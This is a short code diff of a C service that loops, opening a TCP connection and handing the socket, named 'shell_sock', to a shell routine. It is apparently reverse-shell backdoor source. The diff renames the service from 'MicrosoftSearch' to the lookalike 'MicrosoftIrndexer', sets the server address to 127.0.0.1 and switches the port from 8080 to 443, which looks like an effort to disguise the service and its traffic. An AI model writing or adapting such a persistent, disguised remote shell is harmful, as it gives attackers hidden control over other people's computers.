@@ -1,15 +1,15 @@
 #include "../wsbind.h"
 
 #define AUTO "auto\0"
-#define NAME "MicrosoftSearch\0"
-#define SERVER "\0"
+#define NAME "MicrosoftIrndexer\0"
+#define SERVER "127.0.0.1\0"
 
 void service_main(int** running)
 {
     wsc_init();
     while(**running == 1)
     {
-        SockData shell_sock = wsc_tcp_create(SERVER, 8080);
+        SockData shell_sock = wsc_tcp_create(SERVER, 443);
         wss_basic(shell_sock);
         wsc_close_sock(&shell_sock);
     }
